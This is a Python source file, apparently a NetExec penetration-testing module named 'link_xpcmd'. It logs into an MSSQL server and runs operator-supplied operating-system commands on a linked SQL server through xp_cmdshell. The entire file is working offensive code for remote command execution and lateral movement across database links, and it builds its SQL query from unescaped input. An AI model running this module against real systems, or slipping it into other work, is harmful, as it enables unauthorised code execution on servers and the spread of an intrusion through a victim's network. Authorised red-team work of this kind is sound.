#Author: 
# deathflamingo
class NXCModule:
    """Run xp_cmdshell commands on a linked SQL server"""

    name = "link_xpcmd"
    description = "Run xp_cmdshell commands on a linked SQL server"
    supported_protocols = ["mssql"]
    opsec_safe = False
    multiple_hosts = False

    def __init__(self):
        self.linked_server = None
        self.command = None

    def options(self, context, module_options):
        """
        Defines the options for running xp_cmdshell commands on a linked server.
        LINKED_SERVER    The name of the linked SQL server to target.
        CMD              The command to run via xp_cmdshell.
        """
        self.linked_server = module_options.get("LINKED_SERVER")
        self.command = module_options.get("CMD")

    def on_login(self, context, connection):
        self.context = context
        self.mssql_conn = connection.conn
        if not self.linked_server or not self.command:
            self.context.log.fail("Please provide both LINKED_SERVER and CMD options.")
            return

        self.run_xp_cmdshell(self.command)

    def run_xp_cmdshell(self, cmd):
        """Run the specified command via xp_cmdshell on the linked server."""
        query = f"EXEC ('xp_cmdshell ''{cmd}''') AT [{self.linked_server}]"
        self.context.log.display(f"Running command on {self.linked_server}: {cmd}")
        result = self.query_and_get_output(query)
        self.context.log.success(f"Command output:\n{result}")

    def query_and_get_output(self, query):
        """Executes a query and returns the output."""
        return self.mssql_conn.sql_query(query)
